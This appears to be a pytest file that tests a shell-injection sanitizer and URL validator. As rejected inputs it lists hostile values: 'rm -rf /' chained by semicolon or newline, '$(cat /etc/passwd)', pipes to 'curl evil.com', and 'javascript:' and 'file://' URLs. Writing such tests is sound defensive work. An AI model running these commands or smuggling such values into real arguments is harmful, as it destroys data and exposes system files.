"""Tests for core.security.sanitize — shell injection blocking."""
from __future__ import annotations

import pytest

from core.security.sanitize import sanitize_shell_arg, sanitize_tool_args, validate_url


# --- sanitize_shell_arg ---

def test_safe_string_passes():
    assert sanitize_shell_arg("https://github.com/user/repo") == "https://github.com/user/repo"


def test_semicolon_injection_blocked():
    with pytest.raises(ValueError, match="prohibited"):
        sanitize_shell_arg("repo; rm -rf /")


def test_backtick_injection_blocked():
    with pytest.raises(ValueError, match="prohibited"):
        sanitize_shell_arg("`whoami`")


def test_dollar_paren_injection_blocked():
    with pytest.raises(ValueError, match="prohibited"):
        sanitize_shell_arg("$(cat /etc/passwd)")


def test_pipe_injection_blocked():
    with pytest.raises(ValueError, match="prohibited"):
        sanitize_shell_arg("repo | curl evil.com")


def test_newline_injection_blocked():
    with pytest.raises(ValueError, match="prohibited"):
        sanitize_shell_arg("repo\nrm -rf /")


def test_ampersand_injection_blocked():
    with pytest.raises(ValueError, match="prohibited"):
        sanitize_shell_arg("repo && curl evil.com")


# --- validate_url ---

def test_validate_url_accepts_valid():
    assert validate_url("https://github.com/user/repo") == "https://github.com/user/repo"
    assert validate_url("http://example.com") == "http://example.com"


def test_validate_url_rejects_dangerous():
    with pytest.raises(ValueError, match="prohibited"):
        validate_url("javascript:alert(1)")
    with pytest.raises(ValueError, match="prohibited"):
        validate_url("file:///etc/passwd")


# --- sanitize_tool_args ---

def test_sanitize_tool_args_all_clean():
    args = {"repo": "my-repo", "branch": "main", "count": 5}
    result = sanitize_tool_args(args)
    assert result == args


def test_sanitize_tool_args_rejects_injection():
    with pytest.raises(ValueError, match="prohibited"):
        sanitize_tool_args({"repo": "good-repo", "name": "bad; rm -rf /"})
